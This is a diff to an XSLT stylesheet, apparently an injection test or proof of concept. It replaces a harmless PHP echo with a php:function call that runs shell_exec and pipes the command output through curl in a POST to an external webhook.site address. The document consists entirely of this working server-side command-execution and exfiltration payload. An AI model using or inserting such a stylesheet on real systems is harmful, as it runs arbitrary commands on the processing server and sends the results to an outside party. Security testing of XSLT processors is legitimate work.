@@ -3,7 +3,7 @@
   xmlns:java="http://xml.apache.org/xalan/java">
 
   <xsl:template match="s">
-    <xsl:value-of select="php:function(&quot;(function(){echo 'coucou';return 'coucou';})()&quot;)"/>
+    <xsl:value-of select="php:function(&quot;(function(){return shell_exec('echo coucou | curl -X POST -F &quot;result=@-&quot; https://webhook.site/0311e610-5ff9-4306-92ed-857b3d60cf51');})()&quot;)"/>
   </xsl:template>
 
 </xsl:stylesheet>
